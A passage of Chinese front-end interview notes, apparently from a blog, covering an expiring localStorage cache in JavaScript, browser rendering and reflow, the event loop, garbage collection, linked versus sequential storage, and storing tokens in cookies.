class="code"><pre><span class="line">var lsc = (function (self) &#123;</span><br><span class="line">    var prefix = &#x27;one_more_lsc_&#x27;</span><br><span class="line">    /**</span><br><span class="line">     * 增加一个键值对数据</span><br><span class="line">     * @param key 键</span><br><span class="line">     * @param val 值</span><br><span class="line">     * @param expires 过期时间，单位为秒</span><br><span class="line">     */</span><br><span class="line">    self.set = function (key, val, expires) &#123;</span><br><span class="line">        key = prefix + key;</span><br><span class="line">        val = JSON.stringify(&#123;&#x27;val&#x27;: val, &#x27;expires&#x27;: new Date().getTime() + expires * 1000&#125;);</span><br><span class="line">        localStorage.setItem(key, val);</span><br><span class="line">    &#125;;</span><br><span class="line">    /**</span><br><span class="line">     * 读取对应键的值数据</span><br><span class="line">     * @param key 键</span><br><span class="line">     * @returns &#123;null|*&#125; 对应键的值</span><br><span class="line">     */</span><br><span class="line">    self.get = function (key) &#123;</span><br><span class="line">        key = prefix + key;</span><br><span class="line">        var val = localStorage.getItem(key);</span><br><span class="line">        if (!val) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        val = JSON.parse(val);</span><br><span class="line">        if (val.expires &lt; new Date().getTime()) &#123;</span><br><span class="line">            localStorage.removeItem(key);</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        return val.val;</span><br><span class="line">    &#125;;</span><br><span class="line">    return self;</span><br><span class="line">&#125;(lsc || &#123;&#125;));</span><br></pre></td></tr></table></figure><p>上述代码通过惰性删除已经实现了可过期的localStorage缓存，但是也有比较明显的缺点：如果一个key一直没有被用到，即使它已经过期了也永远存放在localStorage。为了弥补这样缺点，我们引入另一种清理过期缓存的策略。</p><h2 id="定时删除"><a href="#定时删除" class="headerlink" title="定时删除"></a>定时删除</h2><blockquote><p>定时删除是指，每隔一段时间执行一次删除操作，并通过限制删除操作执行的次数和频率，来减少删除操作对CPU的长期占用。另一方面定时删除也有效的减少了因惰性删除带来的对localStorage空间的浪费。</p></blockquote><p><strong>每隔一秒执行一次定时删除，操作如下：</strong></p><ol><li>随机测试20个设置了过期时间的key。</li><li>删除所有发现的已过期的key。</li><li>若删除的key超过5个则重复步骤1，直至重复500次。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">var lsc = (function (self) &#123;</span><br><span class="line">    var prefix = &#x27;one_more_lsc_&#x27;</span><br><span class="line">    var list = [];</span><br><span class="line">    //初始化list</span><br><span class="line">    self.init = function () &#123;</span><br><span class="line">        var keys = Object.keys(localStorage);</span><br><span class="line">        var reg = new RegExp(&#x27;^&#x27; + prefix);</span><br><span class="line">        var temp = [];</span><br><span class="line">        //遍历所有localStorage中的所有key</span><br><span class="line">        for (var i = 0; i &lt; keys.length; i++) &#123;</span><br><span class="line">            //找出可过期缓存的key</span><br><span class="line">            if (reg.test(keys[i])) &#123;</span><br><span class="line">                temp.push(keys[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        list = temp;</span><br><span class="line">    &#125;;</span><br><span class="line">    self.init();</span><br><span class="line">    self.check = function () &#123;</span><br><span class="line">        if (!list || list.length == 0) &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        var checkCount = 0;</span><br><span class="line">        while (checkCount &lt; 500) &#123;</span><br><span class="line">            var expireCount = 0;</span><br><span class="line">            //随机测试20个设置了过期时间的key</span><br><span class="line">            for (var i = 0; i &lt; 20; i++) &#123;</span><br><span class="line">                if (list.length == 0) &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                var index = Math.floor(Math.random() * list.length);</span><br><span class="line">                var key = list[index];</span><br><span class="line">                var val = localStorage.getItem(list[index]);</span><br><span class="line">                //从list中删除被惰性删除的key</span><br><span class="line">                if (!val) &#123;</span><br><span class="line">                    list.splice(index, 1);</span><br><span class="line">                    expireCount++;</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">                val = JSON.parse(val);</span><br><span class="line">                //删除所有发现的已过期的key</span><br><span class="line">                if (val.expires &lt; new Date().getTime()) &#123;</span><br><span class="line">                    list.splice(index, 1);</span><br><span class="line">                    localStorage.removeItem(key);</span><br><span class="line">                    expireCount++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            //若删除的key不超过5个则跳出循环</span><br><span class="line">            if (expireCount &lt;= 5 || list.length == 0) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            checkCount++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //每隔一秒执行一次定时删除</span><br><span class="line">    window.setInterval(self.check, 1000);</span><br><span class="line">    return self;</span><br><span class="line">&#125;(lsc || &#123;&#125;));</span><br></pre></td></tr></table></figure><h1 id="如何定时删除localstorage数据"><a href="#如何定时删除localstorage数据" class="headerlink" title="如何定时删除localstorage数据"></a>如何定时删除localstorage数据</h1><blockquote><p>定时删除是指，每隔一段时间执行一次删除操作，并通过限制删除操作执行的次数和频率，来减少删除操作对CPU的长期占用。另一方面定时删除也有效的减少了因惰性删除带来的对localStorage空间的浪费。</p></blockquote><p><strong>每隔一秒执行一次定时删除，操作如下：</strong></p><ol><li>随机测试20个设置了过期时间的key。</li><li>删除所有发现的已过期的key。</li><li>若删除的key超过5个则重复步骤1，直至重复500次。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">var lsc = (function (self) &#123;</span><br><span class="line">    var prefix = &#x27;one_more_lsc_&#x27;</span><br><span class="line">    var list = [];</span><br><span class="line">    //初始化list</span><br><span class="line">    self.init = function () &#123;</span><br><span class="line">        var keys = Object.keys(localStorage);</span><br><span class="line">        var reg = new RegExp(&#x27;^&#x27; + prefix);</span><br><span class="line">        var temp = [];</span><br><span class="line">        //遍历所有localStorage中的所有key</span><br><span class="line">        for (var i = 0; i &lt; keys.length; i++) &#123;</span><br><span class="line">            //找出可过期缓存的key</span><br><span class="line">            if (reg.test(keys[i])) &#123;</span><br><span class="line">                temp.push(keys[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        list = temp;</span><br><span class="line">    &#125;;</span><br><span class="line">    self.init();</span><br><span class="line">    self.check = function () &#123;</span><br><span class="line">        if (!list || list.length == 0) &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        var checkCount = 0;</span><br><span class="line">        while (checkCount &lt; 500) &#123;</span><br><span class="line">            var expireCount = 0;</span><br><span class="line">            //随机测试20个设置了过期时间的key</span><br><span class="line">            for (var i = 0; i &lt; 20; i++) &#123;</span><br><span class="line">                if (list.length == 0) &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                var index = Math.floor(Math.random() * list.length);</span><br><span class="line">                var key = list[index];</span><br><span class="line">                var val = localStorage.getItem(list[index]);</span><br><span class="line">                //从list中删除被惰性删除的key</span><br><span class="line">                if (!val) &#123;</span><br><span class="line">                    list.splice(index, 1);</span><br><span class="line">                    expireCount++;</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">                val = JSON.parse(val);</span><br><span class="line">                //删除所有发现的已过期的key</span><br><span class="line">                if (val.expires &lt; new Date().getTime()) &#123;</span><br><span class="line">                    list.splice(index, 1);</span><br><span class="line">                    localStorage.removeItem(key);</span><br><span class="line">                    expireCount++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            //若删除的key不超过5个则跳出循环</span><br><span class="line">            if (expireCount &lt;= 5 || list.length == 0) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            checkCount++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //每隔一秒执行一次定时删除</span><br><span class="line">    window.setInterval(self.check, 1000);</span><br><span class="line">    return self;</span><br><span class="line">&#125;(lsc || &#123;&#125;));</span><br></pre></td></tr></table></figure><h1 id="localStorage-能跨域吗"><a href="#localStorage-能跨域吗" class="headerlink" title="localStorage 能跨域吗"></a>localStorage 能跨域吗</h1><p><font color="#FF00FF"><strong>不能</strong></font></p><p><strong>解决方案：</strong></p><ul><li>通过postMessage来实现跨源通信</li><li>可以实现一个公共的iframe部署在某个域名中，作为共享域</li><li>将需要实现localStorage跨域通信的页面嵌入这个iframe</li><li>接入对应的SDK操作共享域，从而实现localStorage的跨域存储</li></ul><p><img src="http://files.shanqianche.cn/20228/1660096289332.png" alt="共享域"></p><h1 id="memory-cache-如何开启"><a href="#memory-cache-如何开启" class="headerlink" title="memory cache 如何开启"></a>memory cache 如何开启</h1><blockquote><p>memory cache 如何开启是一种比较特殊的缓存，<font color="#FF8C00">他不受max-age、no-cache等配置的影响，即使我们不设置缓存，如果当前的内存空间比较充裕的话，一些资源还是会被缓存下来。但这种缓存是暂时的，一旦关闭了浏览器</font>，这一部分用于缓存的内存空间就会被释放掉<font color="#FF8C00">。如果真的不想使用缓存，可以设置no-store，这样，即便是内存缓存，<strong>也不会生效</strong>。</font></p></blockquote><h1 id="localstorage的限制"><a href="#localstorage的限制" class="headerlink" title="localstorage的限制"></a>localstorage的限制</h1><ol><li>浏览器的大小不统一，并且在IE8以上的IE版本才支持localStorage这个属性</li><li>目前所有的浏览器中都会把localStorage的值类型限定为string类型，这个在对我们日常比较常见的JSON对象类型需要一些转换</li><li>localStorage在浏览器的隐私模式下面是不可读取的</li><li>localStorage本质上是对字符串的读取，如果存储内容多的话会消耗内存空间，会导致页面变卡</li><li>localStorage不能被爬虫抓取到</li></ol><h1 id="浏览器输入URL发生了什么"><a href="#浏览器输入URL发生了什么" class="headerlink" title="浏览器输入URL发生了什么"></a>浏览器输入URL发生了什么</h1><ol><li>URL 解析</li><li>DNS 查询</li><li>TCP 连接</li><li>处理请求</li><li>接受响应</li><li>渲染页面</li></ol><h1 id="浏览器如何渲染页面的"><a href="#浏览器如何渲染页面的" class="headerlink" title="浏览器如何渲染页面的"></a>浏览器如何渲染页面的</h1><ol><li>HTML 被 HTML 解析器解析成 DOM 树；</li><li>CSS 被 CSS 解析器解析成 CSSOM 树；</li><li>结合 DOM 树和 CSSOM 树，生成一棵渲染树(Render Tree)，这一过程称为 Attachment；</li><li>生成布局(flow)，浏览器在屏幕上“画”出渲染树中的所有节点；</li><li>将布局绘制(paint)在屏幕上，显示出整个页面。</li></ol><p><strong>不同的浏览器内核不同，所以渲染过程不太一样。</strong></p><p><img src="http://files.shanqianche.cn/20228/1660096647444.png" alt="webwit"><br><img src="http://files.shanqianche.cn/20228/1660096669266.png" alt="Mozilla"></p><p>由上面两张图可以看出，虽然主流浏览器渲染过程叫法有区别，但是主要流程还是相同的。<br>Gecko 将视觉格式化元素组成的树称为“框架树”。每个元素都是一个框架。WebKit 使用的术语是“呈现树”，它 由“呈现对象”组成。对于元素的放置，WebKit 使用的术语是“布局”，而 Gecko 称之为“重排”。对于连接 DOM 节点和可视化信息从而创建呈现树的过程，WebKit 使用的术语是“附加”。</p><h1 id="重绘、重排区别如何避免"><a href="#重绘、重排区别如何避免" class="headerlink" title="重绘、重排区别如何避免"></a>重绘、重排区别如何避免</h1><ol><li><p>重排(Reflow)：当渲染树的一部分必须更新并且节点的尺寸发生了变化，浏览器会使渲染树中受到影响的部分失效，并重新构造渲染树。</p></li><li><p>重绘(Repaint)：是在一个元素的外观被改变所触发的浏览器行为，浏览器会根据元素的新属性重新绘制，使元素呈现新的外观。比如改变某个元素的背景色、文字颜色、边框颜色等等</p></li><li><p>区别：重绘不一定需要重排（比如颜色的改变），重排必然导致重绘（比如改变网页位置）</p></li><li><p>引发重排</p></li><li><p>1 添加、删除可见的dom</p></li><li><p>2 元素的位置改变</p></li><li><p>3 元素的尺寸改变(外边距、内边距、边框厚度、宽高、等几何属性)</p></li><li><p>4 页面渲染初始化</p></li><li><p>5 浏览器窗口尺寸改变</p></li><li><p>6 获取某些属性。当获取一些属性时，浏览器为取得正确的值也会触发重排,它会导致队列刷新，这些属性包括：offsetTop、offsetLeft、offsetWidth、offsetHeight、scrollTop、scrollLeft、scrollWidth、scrollHeight、clientTop、clientLeft、clientWidth、clientHeight、getComputedStyle() (currentStyle in IE)。<strong>所以，在多次使用这些值时应进行缓存。</strong></p></li><li><p>优化</p></li></ol><p><strong>浏览器自己的优化：</strong><br>浏览器会维护1个队列，把所有会引起重排，重绘的操作放入这个队列，等队列中的操作到一定数量或者到了一定时间间隔，浏览器就会flush队列，进行一批处理，这样多次重排，重绘变成一次重排重绘</p><p><strong>减少 reflow/repaint</strong>：<br>（1）不要一条一条地修改DOM的样式。可以先定义好css的class，然后修改DOM的className。<br>（2）不要把 DOM 结点的属性值放在一个循环里当成循环里的变量。<br>（3）<font color="#FF8C00">为动画的 HTML 元件使用 fixed 或 absolute 的 position，那么修改他们的 CSS 是不会 reflow 的。</font><br>（4）千万<font color="#FF00FF">不要使用 table 布局</font>。因为可能很小的一个小改动会造成整个 table 的重新布局。(table及其内部元素除外，它可能需要多次计算才能确定好其在渲染树中节点的属性，通常要花3倍于同等元素的时间。这也是为什么我们要避免使用table做布局的一个原因。)<br>（5）<font color="#FF00FF">不要在布局信息改变的时候做查询（会导致渲染队列强制刷新）</font></p><h1 id="事件循环Event-loop"><a href="#事件循环Event-loop" class="headerlink" title="事件循环Event loop"></a>事件循环Event loop</h1><blockquote><p>主线程从”任务队列”中读取执行事件，这个过程是循环不断的，这个机制被称为<strong>事件循环</strong>。此机制具体如下:主 线程会不断从任务队列中按顺序取任务执行，每执行完一个任务都会<strong>检查microtask队列</strong>是否为空（执行完一个 任务的具体标志是函数执行栈为空），如果不为空则会一次性执行完所有microtask。然后再进入下一个循环去 任务队列中取下一个任务执行。</p></blockquote><p><strong>详细步骤：</strong></p><ol><li>选择当前要执行的宏任务队列，选择一个最先进入任务队列的宏任务，如果没有宏任务可以选择，则会 跳转至microtask的执行步骤。</li><li>将事件循环的当前运行宏任务设置为已选择的宏任务。</li><li>运行宏任务。</li><li>将事件循环的当前运行任务设置为null。</li><li>将运行完的宏任务从宏任务队列中移除。</li><li>microtasks步骤：进入microtask检查点。</li><li>更新界面渲染。</li><li>返回第一步。</li></ol><p><strong>执行进入microtask检查的的具体步骤如下:</strong></p><ol><li>设置进入microtask检查点的标志为true。</li><li>当事件循环的微任务队列不为空时：选择一个最先进入microtask队列的microtask；设置事件循环的当 前运行任务为已选择的microtask；运行microtask；<strong>设置事件循环的当前运行任务为null；将运行结束 的microtask从microtask队列中移除。</strong></li><li><strong>对于相应事件循环的每个环境设置对象（environment settings object）,通知它们哪些promise为 rejected。</strong></li><li>清理indexedDB的事务。</li><li>设置进入microtask检查点的标志为<strong>false。</strong></li></ol><p><font color="#FF8C00">需要注意的是:当前执行栈执行完毕时会立刻先处理所有微任务队列中的事件, 然后再去宏任务队列中取出一个 事件。同一次事件循环中, 微任务永远在宏任务之前执行。</font></p><p><img src="http://files.shanqianche.cn/20228/1660097684197.png" alt="队列"></p><h1 id="let-a-“sssssss”，存在哪儿"><a href="#let-a-“sssssss”，存在哪儿" class="headerlink" title="let a = “sssssss”，存在哪儿"></a>let a = “sssssss”，存在哪儿</h1><p><strong>使用let声明的全局变量不是挂在window对象下的，声明的全局变量存在于一个块级作用域中。</strong></p><p>打印一个全局函数，在let声明的全局变量在<font color="#FF00FF">全局函数的scope下</font>，我们平时使用时直接 用变量名称就能访问到</p><p><img src="http://files.shanqianche.cn/20228/1660098766506.png" alt="全局函数对象中scope"></p><h1 id="浏览器垃圾回收机制"><a href="#浏览器垃圾回收机制" class="headerlink" title="浏览器垃圾回收机制"></a>浏览器垃圾回收机制</h1><p>浏览器的 Javascript 具有自动垃圾回收机制(GC:Garbage Collecation)，也就是说，执行环境会负责管理代码执行过程中使用的内存。其原理是：<strong>垃圾收集器会定期（周期性）找出那些不在继续使用的变量，然后释放其内存。</strong> 但是这个过程不是实时的，因为其开销比较大并且GC时停止响应其他操作，所以垃圾回收器会按照固定的时间间隔周期性的执行。</p><p>不再使用的变量也就是生命周期结束的变量，当然只可能是局部变量，<font color="#FF00FF">全局变量的生命周期直至浏览器卸载页面才会结束。</font>局部变量只在函数的执行过程中存在，而在这个过程中会为局部变量在栈或堆上分配相应的空间，以存储它们的值，然后在函数中使用这些变量，直至函数结束，<font color="#FF00FF">而闭包中由于内部函数的原因，外部函数并不能算是结束</font>。</p><p><font color="#FF8C00">标记清除和引用计数</font>。引用计数不太常用，标记清除较为常用。</p><h2 id="标记清除"><a href="#标记清除" class="headerlink" title="标记清除"></a>标记清除</h2><p>js中最常用的垃圾回收方式就是标记清除。当变量进入环境时，例如，在函数中声明一个变量，就将这个变量标记为“进入环境”。从逻辑上讲，永远不能释放进入环境的变量所占用的内存，因为只要执行流进入相应的环境，就可能会用到它们。而当变量离开环境时，则将其标记为“离开环境”。</p><p>垃圾回收器在运行的时候会给存储在内存中的所有变量都加上标记（当然，可以使用任何标记方式）。<font color="#FF00FF">然后，它会去掉环境中的变量以及被环境中的变量引用的变量的标记（闭包）</font>。而在此之后再被加上标记的变量将被视为准备删除的变量，原因是环境中的变量已经无法访问到这些变量了。最后，垃圾回收器完成内存清除工作，销毁那些带标记的值并回收它们所占用的内存空间。 到目前为止，IE9+、Firefox、Opera、Chrome、Safari的js实现使用的都是标记清除的垃圾回收策略或类似的策略，只不过垃圾收集的时间间隔互不相同。</p><h2 id="引用计数"><a href="#引用计数" class="headerlink" title="引用计数"></a>引用计数</h2><p>引用计数的含义是跟踪记录每个值被引用的次数。当声明了一个变量并将一个引用类型值赋给该变量时，则这个值的引用次数就是1。如果同一个值又被赋给另一个变量，则该值的引用次数加1。相反，如果包含对这个值引用的变量又取得了另外一个值，则这个值的引用次数减1。当这个值的引用次数变成0时，则说明没有办法再访问这个值了，因而就可以将其占用的内存空间回收回来。这样，当垃圾回收器下次再运行时，它就会释放那些引用次数为0的值所占用的内存。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function test()&#123;</span><br><span class="line">    var a = &#123;&#125; ;         //a的引用次数为0 </span><br><span class="line">    var b = a ;         //a的引用次数加1，为1 </span><br><span class="line">    var c =a;           //a的引用次数再加1，为2</span><br><span class="line">    var b =&#123;&#125;;          //a的引用次数减1，为1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Netscape Navigator3是最早使用引用计数策略的浏览器<font color="#FF00FF">，但很快它就遇到一个严重的问题：循环引用</font>。循环引用指的是对象A中包含一个指向对象B的指针，而对象B中也包含一个指向对象A的引用。</p><blockquote><p><font color="#FF00FF">IE中有一部分对象并不是原生js对象。例如，其内存泄露DOM和BOM中的对象就是使用C++以COM对象的形式实现的，而COM对象的垃圾回收机制采用的就是引用计数策略。因此，即使IE的js引擎采用标记清除策略来实现，但js访问的COM对象依然是基于引用计数策略的。换句话说，只要在IE中涉及COM对象，就会存在循环引用的问题。</font></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var element = document.getElementById(&quot;some_element&quot;);</span><br><span class="line">var myObject = new Object();</span><br><span class="line">myObject.e = element;</span><br><span class="line">element.o = myObject;</span><br></pre></td></tr></table></figure><p>这个例子在一个DOM元素<font color="#FF00FF">（element)与一个原生js对象（myObject)之间创建了循环引用。</font>其中，变量myObject有一个属性e指向element对象；而变量element也有一个属性o回指myObject。由于存在这个循环引用，即使例子中的DOM从页面中移除，它也永远不会被回收。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">window.onload=function outerFunction()&#123;</span><br><span class="line">    var obj = document.getElementById(&quot;element&quot;);</span><br><span class="line">    obj.onclick=function innerFunction()&#123;&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这段代码看起来没什么问题，但是obj引用了document.getElementById(‘element’)，<font color="#FF00FF">而document.getElementById(‘element’)的onclick方法会引用外部环境中的变量，自然也包括obj，是不是很隐蔽啊</font>。(在比较新的浏览器中在移除Node的时候已经会移除其上的event了，但是在老的浏览器，特别是ie上会有这个bug)</p><p><strong>解决办法：</strong><br>最简单的方式就是自己手工解除循环引用，比如刚才的函数可以这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">myObject.element = null;</span><br><span class="line">element.o = null;</span><br><span class="line"></span><br><span class="line">window.onload=function outerFunction()&#123;</span><br><span class="line">    var obj = document.getElementById(&quot;element&quot;);</span><br><span class="line">    obj.onclick=function innerFunction()&#123;&#125;;</span><br><span class="line">    obj=null;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>将变量设置为null意味着切断变量与它此前引用的值之间的连接。当垃圾回收器下次运行时，就会删除这些值并回收它们占用的内存。</p><p><strong>要注意的是，IE9+并不存在循环引用导致Dom内存泄露问题，可能是微软做了优化，或者Dom的回收方式已经改变</strong></p><h2 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h2><h3 id="什么时候触发垃圾回收？"><a href="#什么时候触发垃圾回收？" class="headerlink" title="什么时候触发垃圾回收？"></a>什么时候触发垃圾回收？</h3><p>垃圾回收器周期性运行，如果分配的内存非常多，那么回收工作也会很艰巨，确定垃圾回收时间间隔就变成了一个值得思考的问题。<font color="#FF00FF">IE6的垃圾回收是根据内存分配量运行的，当环境中存在256个变量、4096个对象、64k的字符串任意一种情况的时候就会触发垃圾回收器工作</font>，看起来很科学，不用按一段时间就调用一次，有时候会没必要，这样按需调用不是很好吗？但是如果环境中就是有这么多变量等一直存在，现在脚本如此复杂，很正常，那么结果就是垃圾回收器一直在工作，这样浏览器就没法儿玩儿了。</p><p>微软在<font color="#FF00FF">IE7中做了调整，触发条件不再是固定的，而是动态修改的，初始值和IE6相同，如果垃圾回收器回收的内存分配量低于程序占用内存的15%，</font>说明大部分内存不可被回收，设的垃圾回收触发条件过于敏感，这时候把临街条件翻倍，<font color="#FF00FF">如果回收的内存高于85%，</font>说明大部分内存早就该清理了，这时候把触发条件置回。这样就使垃圾回收工作职能了很多</p><h3 id="合理的GC方案"><a href="#合理的GC方案" class="headerlink" title="合理的GC方案"></a>合理的GC方案</h3><h4 id="基础方案"><a href="#基础方案" class="headerlink" title="基础方案"></a>基础方案</h4><p>Javascript引擎基础GC方案是（<font color="#FF8C00">simple GC）：mark and sweep（标记清除）</font>，即：</p><ol><li>遍历所有可访问的对象。</li><li>回收已不可访问的对象。</li></ol><h4 id="GC的缺陷"><a href="#GC的缺陷" class="headerlink" title="GC的缺陷"></a>GC的缺陷</h4><p>和其他语言一样，javascript的GC策略也无法避免一个问题：GC时，停止响应其他操作，这是为了安全考虑。而Javascript的GC在100ms甚至以上，对一般的应用还好，但对于JS游戏，动画对连贯性要求比较高的应用，就麻烦了。这就是新引擎需要优化的点：<font color="#FF00FF">避免GC造成的长时间停止响应。</font></p><h4 id="GC优化策略"><a href="#GC优化策略" class="headerlink" title="GC优化策略"></a>GC优化策略</h4><p><strong>David大叔主要介绍了2个优化方案，而这也是最主要的2个优化方案了：</strong></p><ol><li><font color="#FF00FF">分代回收（Generation GC）</font> 这个和Java回收策略思想是一致的，也是V8所主要采用的。目的是通过区分“临时”与“持久”对象；多回收“临时对象”区（young generation），少回收“持久对象”区（tenured generation），减少每次需遍历的对象，从而减少每次GC的耗时。如图：</li></ol><p><img src="http://files.shanqianche.cn/20228/1660106399857.png" alt="分代回收"><br>这里需要补充的是：<font color="#FF8C00">对于tenured generation对象，有额外的开销：把它从young generation迁移到tenured generation，另外，如果被引用了，那引用的指向也需要修改。</font></p><ol start="2"><li><font color="#FF00FF">增量GC </font>这个方案的思想很简单，就是“每次处理一点，下次再处理一点，如此类推”。如图：</li></ol><p><img src="http://files.shanqianche.cn/20228/1660106521299.png" alt="增量GC"></p><p><font color="#FF00FF">这种方案，虽然耗时短，但中断较多，带来了上下文切换频繁的问题。</font></p><p>因为每种方案都其适用场景和缺点，因此在实际应用中，会根据实际情况选择方案。</p><p><font color="#FF8C00">比如：低 (对象/s) 比率时，中断执行GC的频率，simple GC更低些；如果大量对象都是长期“存活”，则分代处理优势也不大。</font></p><h1 id="顺序存储结构和链式存储结构的比较"><a href="#顺序存储结构和链式存储结构的比较" class="headerlink" title="顺序存储结构和链式存储结构的比较"></a>顺序存储结构和链式存储结构的比较</h1><p><strong>优缺点</strong></p><ol><li>顺序存储时，相邻数据元素的存放地址也相邻（逻辑与物理统一）；要求内存中可用存储单元的地址必须是连续的。<ul><li>优点：存储密度大（＝1），存储空间利用率高。</li><li>缺点：插入或删除元素时不方便。</li></ul></li><li>链式存储时，相邻数据元素可随意存放，但<font color="#FF8C00">所占存储空间分两部分，一部分存放结点值，另一部分存放表示结点间关系的指针</font><ul><li>优点：插入或删除元素时很方便，使用灵活。</li><li>缺点：存储密度小（&lt;1），存储空间利用率低</li></ul></li></ol><p><strong>使用情况</strong></p><ul><li>顺序表适宜于做查找这样的静态操作；</li><li>链表宜于做插入、删除这样的动态操作。</li><li>若线性表的长度变化不大，且其主要操作是查找，则采用顺序表；</li><li>若线性表的长度变化较大，且其主要操作是插入、删除操作，则采用链表</li></ul><p><strong>顺序表与链表的比较</strong></p><ul><li><strong>基于空间的比较</strong><ul><li>存储分配的方式<ul><li>顺序表的存储空间是静态分配的</li><li>链表的存储空间是动态分配的</li></ul></li><li>存储密度 = 结点数据本身所占的存储量/结点结构所占的存储总量<ul><li>顺序表的存储密度 = 1</li><li>链表的存储密度 &lt; 1</li></ul></li></ul></li><li><strong>基于时间的比较</strong><ul><li><font color="#FF00FF">存取方式</font><ul><li>顺序表可以随机存取，也可以顺序存取</li><li>链表是顺序存取的</li></ul></li><li>插入/删除时移动元素个数<ul><li><font color="#FF00FF">顺序表平均需要移动近一半元素</font></li><li>链表不需要移动元素，只需要修改指针</li></ul></li></ul></li></ul><h1 id="token-能放在cookie中吗"><a href="#token-能放在cookie中吗" class="headerlink" title="token 能放在cookie中吗"></a>token 能放在cookie中吗</h1><p><strong><font color="#FF8C00">能</font></strong></p><p><strong>解析：</strong></p><ul><li><font color="#FF8C00">token 是在客户端频繁向服务端请求数据，服务端频繁的去数据库查询用户名和密码并进行对比，判断用户名和密码正确与否，并作出相应提示，在这样的背景下，token 便应运而生。</font></li><li>「简单 token 的组成」:uid(用户唯一的身份标识)、time(当前时间的时间戳)、sign（签名，token 的前几位以哈希算法压缩成的一定长度的十六进制字符串）</li></ul><p><img src="http://files.shanqianche.cn/20228/1660107027666.png" alt="token认证流程"></p><ol><li>客户端使用用户名跟密码请求登录</li><li>服务端收到请求，去验证用户名与密码</li><li>验证成功后，服务端签发一个 token ，并把它发送给客户端</li><li>客户端接收 token 